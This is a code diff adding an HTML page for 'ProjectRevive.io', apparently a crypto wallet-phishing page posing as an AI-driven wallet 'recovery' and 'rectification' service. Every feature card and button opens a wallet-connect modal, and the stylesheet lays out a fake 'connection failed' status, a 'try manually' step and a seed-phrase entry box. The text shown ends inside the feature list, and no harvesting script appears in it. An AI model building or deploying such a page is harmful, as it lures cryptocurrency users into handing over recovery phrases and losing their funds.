@@ -1,0 +1,1454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProjectRevive.io</title>
+    <style>
+        :root {
+            --bg-color: #f8f9fa;
+            --text-color: #333;
+            --header-bg: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            --nav-item-bg: rgba(255, 255, 255, 0.2);
+            --nav-item-hover: rgba(255, 255, 255, 0.3);
+            --nav-item-active: #3498db;
+            --button-bg: #3498db;
+            --button-hover: #2980b9;
+            --card-bg: white;
+            --card-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            --card-shadow-hover: 0 5px 20px rgba(0,0,0,0.15);
+            --feature-icon-bg: transparent; /* Changed from #3498db to remove blue background */
+            --footer-bg: #2c3e50;
+            --footer-border: #34495e;
+            --modal-bg: white;
+            --modal-overlay: rgba(0,0,0,0.5);
+            --input-bg: #34495e;
+            --input-border: #34495e;
+            --input-placeholder: #bdc3c7;
+            --wallet-option-border: #e0e0e0;
+            --status-failed: #e74c3c;
+            --try-manually: #f39c12;
+            --try-manually-hover: #e67e22;
+            --toggle-bg: #f1f3f4;
+            --toggle-btn: #666;
+            --toggle-btn-active-bg: white;
+            --toggle-btn-active: #333;
+        }
+
+        [data-theme="dark"] {
+            --bg-color: #1a1a1a;
+            --text-color: #e0e0e0;
+            --header-bg: linear-gradient(135deg, #1c2526 0%, #1e4d7a 100%);
+            --nav-item-bg: rgba(255, 255, 255, 0.1);
+            --nav-item-hover: rgba(255, 255, 255, 0.2);
+            --nav-item-active: #1e4d7a;
+            --button-bg: #1e4d7a;
+            --button-hover: #16385c;
+            --card-bg: #2a2a2a;
+            --card-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            --card-shadow-hover: 0 5px 20px rgba(0,0,0,0.4);
+            --feature-icon-bg: transparent; /* Changed from #1e4d7a to remove blue background */
+            --footer-bg: #1c2526;
+            --footer-border: #2c3e50;
+            --modal-bg: #2a2a2a;
+            --modal-overlay: rgba(0,0,0,0.7);
+            --input-bg: #2c3e50;
+            --input-border: #2c3e50;
+            --input-placeholder: #95a5a6;
+            --wallet-option-border: #4a4a4a;
+            --status-failed: #ff6b6b;
+            --try-manually: #d35400;
+            --try-manually-hover: #b34700;
+            --toggle-bg: #2c3e50;
+            --toggle-btn: #95a5a6;
+            --toggle-btn-active-bg: #3a506b;
+            --toggle-btn-active: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        /* Header */
+        .header {
+            background: var(--header-bg);
+            color: white;
+            padding: 80px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .nav {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .nav-item {
+            background: var(--nav-item-bg);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .nav-item:hover {
+            background: var(--nav-item-hover);
+        }
+
+        .nav-item.active {
+            background: var(--nav-item-active);
+        }
+
+        .connect-wallet-top {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: var(--button-bg);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .connect-wallet-top:hover {
+            background: var(--button-hover);
+        }
+
+        .theme-toggle {
+            position: absolute;
+            top: 20px;
+            right: 150px;
+            background: var(--button-bg);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .theme-toggle:hover {
+            background: var(--button-hover);
+        }
+
+        .logo {
+            font-size: 16px;
+            font-weight: bold;
+            position: absolute;
+            top: 25px;
+            left: 20px;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            font-weight: 300;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            max-width: 800px;
+            margin: 0 auto 40px;
+            line-height: 1.6;
+        }
+
+        .connect-wallet-main {
+            background: var(--card-bg);
+            color: var(--text-color);
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+
+        .connect-wallet-main:hover {
+            background: var(--button-hover);
+        }
+
+        /* Backed By Section */
+        .backed-by {
+            background: var(--card-bg);
+            padding: 60px 20px;
+            border-top: 1px solid #e0e0e0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .backed-by-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .backed-by h3 {
+            font-size: 1.5rem;
+            color: var(--text-color);
+            margin-bottom: 40px;
+            font-weight: 700; /* Thicken and bold */
+        }
+
+        .partners-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 30px;
+            align-items: center;
+            justify-items: center;
+        }
+
+        .partner-logo {
+            width: 120px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.7;
+            transition: opacity 0.3s, transform 0.3s;
+            cursor: pointer;
+        }
+
+        .partner-logo:hover {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+
+        .partner-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            filter: grayscale(100%);
+            transition: filter 0.3s;
+        }
+
+        .partner-logo:hover img {
+            filter: grayscale(0%);
+        }
+
+        .partner-placeholder {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            width: 100%;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 80px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .features h2 {
+            font-size: 2rem;
+            margin-bottom: 50px;
+            color: var(--text-color);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .feature-card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: var(--card-shadow);
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--card-shadow-hover);
+        }
+
+        .feature-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--feature-icon-bg);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: var(--text-color); /* Changed to text color for visibility without background */
+        }
+
+        .feature-title {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: var(--text-color);
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--footer-bg);
+            color: white;
+            padding: 80px 20px 40px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+        }
+
+        .footer-section h3 {
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+        }
+
+        .footer-text {
+            line-height: 1.6;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .subscribe-section {
+            text-align: right;
+        }
+
+        .subscribe-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            max-width: 300px;
+            margin-left: auto;
+        }
+
+        .email-input {
+            padding: 12px;
+            border: 1px solid var(--input-border);
+            border-radius: 5px;
+            background: var(--input-bg);
+            color: white;
+        }
+
+        .email-input::placeholder {
+            color: var(--input-placeholder);
+        }
+
+        .subscribe-btn {
+            background: var(--button-bg);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .subscribe-btn:hover {
+            background: var(--button-hover);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            margin-top: 60px;
+            padding-top: 20px;
+            border-top: 1px solid var(--footer-border);
+            opacity: 0.7;
+        }
+
+        .footer-nav {
+            margin-top: 40px;
+            text-align: left;
+        }
+
+        .footer-nav a {
+            color: white;
+            text-decoration: none;
+            margin-right: 30px;
+            opacity: 0.8;
+        }
+
+        .footer-nav a:hover {
+            opacity: 1;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--modal-overlay);
+        }
+
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--modal-bg);
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .modal h3 {
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border: 2px solid var(--wallet-option-border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: border-color 0.3s, background 0.3s;
+            position: relative;
+        }
+
+        .wallet-option:hover {
+            border-color: var(--button-bg);
+            background: var(--bg-color);
+        }
+
+        .wallet-option.loading {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--button-bg);
+            border-radius: 8px;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            overflow: hidden;
+        }
+
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .wallet-name {
+            font-weight: bold;
+            color: var(--text-color);
+            flex: 1;
+        }
+
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--bg-color);
+            border-top: 2px solid var(--button-bg);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .connection-status {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .status-failed {
+            color: var(--status-failed);
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .try-manually {
+            background: var(--try-manually);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .try-manually:hover {
+            background: var(--try-manually-hover);
+        }
+
+        .expanded-wallets {
+            display: none;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid var(--wallet-option-border);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: var(--card-bg);
+        }
+
+        .wallet-item:hover {
+            border-color: var(--button-bg);
+            background: var(--bg-color);
+            transform: translateY(-2px);
+        }
+
+        .wallet-item .wallet-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 10px;
+        }
+
+        .wallet-item .wallet-name {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .seed-phrase-section {
+            display: none;
+        }
+
+        .input-type-toggle {
+            display: flex;
+            background: var(--toggle-bg);
+            border-radius: 8px;
+            padding: 4px;
+            margin-bottom: 20px;
+            gap: 4px;
+        }
+
+        .toggle-btn {
+            flex: 1;
+            padding: 10px 16px;
+            border: none;
+            border-radius: 6px;
+            background: transparent;
+            color: var(--toggle-btn);
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .toggle-btn.active {
+            background: var(--toggle-btn-active-bg);
+            color: var(--toggle-btn-active);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .toggle-btn:hover:not(.active) {
+            color: var(--toggle-btn-active);
+        }
+
+        .input-section {
+            margin-bottom: 20px;
+        }
+
+        .input-description {
+            margin-bottom: 15px;
+            color: var(--toggle-btn);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .seed-phrase-input {
+            width: 100%;
+            height: 120px;
+            padding: 15px;
+            border: 2px solid var(--wallet-option-border);
+            border-radius: 8px;
+            resize: vertical;
+            font-family: monospace;
+            margin-bottom: 20px;
+            background: var(--card-bg);
+            color: var(--text-color);
+        }
+
+        .seed-phrase-input:focus {
+            outline: none;
+            border-color: var(--button-bg);
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .btn-primary {
+            background: var(--button-bg);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--button-hover);
+        }
+
+        .btn-secondary {
+            background: var(--toggle-btn);
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: var(--input-placeholder);
+        }
+
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--toggle-btn);
+        }
+
+        .close:hover {
+            color: var(--toggle-btn-active);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 40px;
+            }
+            
+            .subscribe-section {
+                text-align: left;
+            }
+            
+            .subscribe-form {
+                margin-left: 0;
+            }
+            
+            .nav {
+                position: static;
+                transform: none;
+                margin-bottom: 40px;
+            }
+            
+            .connect-wallet-top {
+                position: static;
+                margin-bottom: 20px;
+            }
+            
+            .theme-toggle {
+                position: static;
+                margin-bottom: 20px;
+            }
+            
+            .logo {
+                position: static;
+                text-align: center;
+                margin-bottom: 20px;
+            }
+            
+            .partners-grid {
+                grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+                gap: 20px;
+            }
+            
+            .partner-logo {
+                width: 100px;
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Section -->
+    <section class="header">
+        <div class="logo">PROJECTREVIVE.IO</div>
+        
+        <div class="nav">
+            <div class="nav-item active">All</div>
+            <div class="nav-item">Ethereum</div>
+            <div class="nav-item">BSC</div>
+            <div class="nav-item">Polygon</div>
+            <div class="nav-item">Avalanche</div>
+            <div class="nav-item">Solana</div>
+            <div class="nav-item">Cardano</div>
+        </div>
+        
+        <button class="theme-toggle" onclick="toggleTheme()">🅾 Toggle.....</button>
+        <button class="connect-wallet-top" onclick="openWalletModal()">CONNECT WALLET</button>
+        
+        <h1>ProjectRevive.io</h1>
+        <p class="subtitle">
+            An Open, Secure, and AI-Driven Protocol for Autonomous Wallet Syncing,<br>
+            Smart Error Rectification, and Adaptive Blockchain Integration.
+        </p>
+        
+        <button class="connect-wallet-main" onclick="openWalletModal()">CONNECT WALLET</button>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <h2>Features</h2>
+        <div class="features-grid">
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><path fill="currentColor" d="M22 30H10c-1.1 0-2-.9-2-2v-3h2v3h12v-3h2v3c0 1.1-.9 2-2 2m-7-15.2V25h2V14.8l2.6 2.6L21 16l-5-5l-5 5l1.4 1.4z"/><path fill="currentColor" d="M24.8 9.1C23.9 5 20.3 2 16 2S8.1 5 7.2 9.1c-3 .6-5.2 3.3-5.2 6.4C2 19.1 4.9 22 8.5 22H12v-2H8.5C6 20 4 18 4 15.5c0-2.3 1.8-4.3 4.1-4.5H9l.1-.8C9.5 6.6 12.5 4 16 4s6.5 2.6 6.9 6.1l.1.9l.8.1c2.3.2 4.1 2.2 4.1 4.5c0 2.5-2 4.5-4.5 4.5H20v2h3.5c3.6 0 6.5-2.9 6.5-6.5c0-3.2-2.2-5.9-5.2-6.5"/></svg></div>
+                <div class="feature-title">Migration</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><g fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"><path d="M28.772 24.667A4 4 0 0 0 25 22v-1h-2v1a4 4 0 1 0 0 8v4c-.87 0-1.611-.555-1.887-1.333a1 1 0 1 0-1.885.666A4 4 0 0 0 23 36v1h2v-1a4 4 0 0 0 0-8v-4a2 2 0 0 1 1.886 1.333a1 1 0 1 0 1.886-.666M23 24a2 2 0 1 0 0 4zm2 10a2 2 0 1 0 0-4z"/><path d="M13.153 8.621C15.607 7.42 19.633 6 24.039 6c4.314 0 8.234 1.361 10.675 2.546l.138.067c.736.364 1.33.708 1.748.987L32.906 15C41.422 23.706 48 41.997 24.039 41.997S6.479 24.038 15.069 15l-3.67-5.4c.283-.185.642-.4 1.07-.628q.318-.171.684-.35m17.379 6.307l2.957-4.323c-2.75.198-6.022.844-9.172 1.756c-2.25.65-4.75.551-7.065.124a25 25 0 0 1-1.737-.386l1.92 2.827c4.115 1.465 8.981 1.465 13.097.002M16.28 16.63c4.815 1.86 10.602 1.86 15.417-.002a29.3 29.3 0 0 1 4.988 7.143c1.352 2.758 2.088 5.515 1.968 7.891c-.116 2.293-1.018 4.252-3.078 5.708c-2.147 1.517-5.758 2.627-11.537 2.627c-5.785 0-9.413-1.091-11.58-2.591c-2.075-1.437-2.986-3.37-3.115-5.632c-.135-2.35.585-5.093 1.932-7.87c1.285-2.648 3.078-5.197 5.005-7.274m-1.15-6.714c.8.238 1.636.445 2.484.602c2.15.396 4.306.454 6.146-.079a54 54 0 0 1 6.53-1.471C28.45 8.414 26.298 8 24.038 8c-3.445 0-6.658.961-8.908 1.916"/></g></svg></div>
+                <div class="feature-title">Asset Recovery</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 13.333S4.5 14 6.5 17c0 0 .285-.48.821-1.247M17 6c-2.291 1.146-4.688 3.552-6.612 5.822M8 13.333S9.5 14 11.5 17c0 0 5.5-8.5 10.5-11"/></svg></div>
+                <div class="feature-title">Rectification</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><path fill="currentColor" d="M4 7a1 1 0 0 0 0 2h2.22l2.624 10.5c.223.89 1.02 1.5 1.937 1.5h12.47c.903 0 1.67-.6 1.907-1.47L27.75 10h-2.094l-2.406 9H10.78L8.157 8.5A1.984 1.984 0 0 0 6.22 7zm18 14c-1.645 0-3 1.355-3 3s1.355 3 3 3s3-1.355 3-3s-1.355-3-3-3m-9 0c-1.645 0-3 1.355-3 3s1.355 3 3 3s3-1.355 3-3s-1.355-3-3-3m3-14v5h-3l4 4l4-4h-3V7zm-3 16c.564 0 1 .436 1 1s-.436 1-1 1s-1-.436-1-1s.436-1 1-1m9 0c.564 0 1 .436 1 1s-.436 1-1 1s-1-.436-1-1s.436-1 1-1"/></svg></div>
+                <div class="feature-title">Buy</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256"><path fill="currentColor" d="m238.14 72.49l-19.31-19.32a4 4 0 0 0-5.66 5.66l19.32 19.31a12 12 0 0 1 3.51 8.49V168a12 12 0 0 1-24 0v-40a20 20 0 0 0-20-20h-20V56a20 20 0 0 0-20-20H72a20 20 0 0 0-20 20v156H32a4 4 0 0 0 0 8h160a4 4 0 0 0 0-8h-20v-96h20a12 12 0 0 1 12 12v40a20 20 0 0 0 40 0V86.63a19.85 19.85 0 0 0-5.86-14.14M60 212V56a12 12 0 0 1 12-12h80a12 12 0 0 1 12 12v156Zm80-100a4 4 0 0 1-4 4H88a4 4 0 0 1 0-8h48a4 4 0 0 1 4 4"/></svg></div>
+                <div class="feature-title">High Gas Fees</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 14 14"><path fill="currentColor" fill-rule="evenodd" d="M4.998 1.248A1.752 1.752 0 1 0 5 4.753a1.752 1.752 0 0 0 0-3.505M1.997 3.001A3.002 3.002 0 1 1 8 3a3.002 3.002 0 0 1-6.004 0m6.547 7.42A1.75 1.75 0 0 0 6.2 12.998H.625A.625.625 0 0 1 0 12.373c0-2.917 2.19-5.371 4.998-5.371c2.087 0 3.833 1.356 4.592 3.25l-.478.592zm5.293-1.452a.75.75 0 0 0-1.167-.942L9.287 12.22l-1.34-.996a.75.75 0 0 0-.895 1.203l1.918 1.427a.75.75 0 0 0 1.031-.131z" clip-rule="evenodd"/></svg></div>
+                <div class="feature-title">Validate</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M11.001 10h2v5h-2zM11 16h2v2h-2z"/><path fill="currentColor" d="M13.768 4.2C13.42 3.545 12.742 3.138 12 3.138s-1.42.407-1.768 1.063L2.894 18.064a1.99 1.99 0 0 0 .054 1.968A1.98 1.98 0 0 0 4.661 21h14.678c.708 0 1.349-.362 1.714-.968a1.99 1.99 0 0 0 .054-1.968zM4.661 19L12 5.137L19.344 19z"/></svg></div>
+                <div class="feature-title">Slippage Error</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="currentColor" fill-rule="evenodd" d="M8.6 1c1.6.1 3.1.9 4.2 2c1.3 1.4 2 3.1 2 5.1c0 1.6-.6 3.1-1.6 4.4c-1 1.2-2.4 2.1-4 2.4s-3.2.1-4.6-.7s-2.5-2-3.1-3.5S.8 7.5 1.3 6c.5-1.6 1.4-2.9 2.8-3.8C5.4 1.3 7 .9 8.6 1m.5 12.9c1.3-.3 2.5-1 3.4-2.1c.8-1.1 1.3-2.4 1.2-3.8c0-1.6-.6-3.2-1.7-4.3c-1-1-2.2-1.6-3.6-1.7c-1.3-.1-2.7.2-3.8 1S2.7 4.9 2.3 6.3c-.4 1.3-.4 2.7.2 4q.9 1.95 2.7 3c1.2.7 2.6.9 3.9.6M7.9 7.5L10.3 5l.7.7l-2.4 2.5l2.4 2.5l-.7.7l-2.4-2.5l-2.4 2.5l-.7-.7l2.4-2.5l-2.4-2.5l.7-.7z" clip-rule="evenodd"/></svg></div>
+                <div class="feature-title">Transaction Error</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M13.544 10.456a4.37 4.37 0 0 0-6.176 0l-3.089 3.088a4.367 4.367 0 1 0 6.177 6.177L12 18.177"/><path d="M10.456 13.544a4.37 4.37 0 0 0 6.176 0l3.089-3.088a4.367 4.367 0 1 0-6.177-6.177L12 5.823"/></g></svg></div>
+                <div class="feature-title">Cross Chain Transfer</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="m16 11.78l4.24-7.33l1.73 1l-5.23 9.05l-6.51-3.75L5.46 19H22v2H2V3h2v14.54L9.5 8z"/></svg></div>
+                <div class="feature-title">Staking Issues</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256"><path fill="currentColor" d="M224 48v104a16 16 0 0 1-16 16H99.31l10.35 10.34a8 8 0 0 1-11.32 11.32l-24-24a8 8 0 0 1 0-11.32l24-24a8 8 0 0 1 11.32 11.32L99.31 152H208V48H96v8a8 8 0 0 1-16 0v-8a16 16 0 0 1 16-16h112a16 16 0 0 1 16 16m-56 144a8 8 0 0 0-8 8v8H48V104h108.69l-10.35 10.34a8 8 0 0 0 11.32 11.32l24-24a8 8 0 0 0 0-11.32l-24-24a8 8 0 0 0-11.32 11.32L156.69 88H48a16 16 0 0 0-16 16v104a16 16 0 0 0 16 16h112a16 16 0 0 0 16-16v-8a8 8 0 0 0-8-8"/></svg></div>
+                <div class="feature-title">Swap/Exchange</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5A6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5S14 7.01 14 9.5S11.99 14 9.5 14"/></svg></div>
+                <div class="feature-title">Claim Reflection</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="currentColor" d="M14.7 3.1c-.4-.4-1-.4-1.4 0l-2.8 2.8L9 4.5l2.8-2.8c.4-.4.4-1 0-1.4s-1-.4-1.4 0L7.6 3.1L6.2 1.7L4.8 3.1l.7.7l-1.4 1.4c-1.4 1.4-1.5 3.5-.5 5.1C1.9 11.8 1 14.1 1 16h2c0-1.3.4-3.2 2.1-4.4c1.5.8 3.4.5 4.6-.7l1.4-1.4l.7.7l1.4-1.4l-1.4-1.4l2.8-2.8c.5-.5.5-1.1.1-1.5"/></svg></div>
+                <div class="feature-title">Dapps Reconnection</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M12 21v-2h7V5h-7V3h7q.825 0 1.413.588T21 5v14q0 .825-.587 1.413T19 21zm-2-4l-1.375-1.45l2.55-2.55H3v-2h8.175l-2.55-2.55L10 7l5 5z"/></svg></div>
+                <div class="feature-title">Login Issues</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M12 20a6 6 0 0 1-6-6c0-4 6-10.75 6-10.75S18 10 18 14a6 6 0 0 1-6 6"/></svg></div>
+                <div class="feature-title">Claim Airdrop</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M17.5 12a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 17.5 9a1.5 1.5 0 0 1 1.5 1.5a1.5 1.5 0 0 1-1.5 1.5m-3-4A1.5 1.5 0 0 1 13 6.5A1.5 1.5 0 0 1 14.5 5A1.5 1.5 0 0 1 16 6.5A1.5 1.5 0 0 1 14.5 8m-5 0A1.5 1.5 0 0 1 8 6.5A1.5 1.5 0 0 1 9.5 5A1.5 1.5 0 0 1 11 6.5A1.5 1.5 0 0 1 9.5 8m-3 4A1.5 1.5 0 0 1 5 10.5A1.5 1.5 0 0 1 6.5 9A1.5 1.5 0 0 1 8 10.5A1.5 1.5 0 0 1 6.5 12M12 3a9 9 0 0 0-9 9a9 9 0 0 0 9 9a1.5 1.5 0 0 0 1.5-1.5c0-.39-.15-.74-.39-1c-.23-.27-.38-.62-.38-1a1.5 1.5 0 0 1 1.5-1.5H16a5 5 0 0 0 5-5c0-4.42-4.03-8-9-8"/></svg></div>
+                <div class="feature-title">NFTS Issues</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
+                <div class="feature-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="2" d="M2.998 1H17.5L21 4.5V23H3zM16 1v5h5M9 12l6 6m0-6l-6 6"/></svg></div>
+                <div class="feature-title">Missing/Irregular Balances</div>
+            </div>
+            <div class="feature-card" onclick="openWalletModal()">
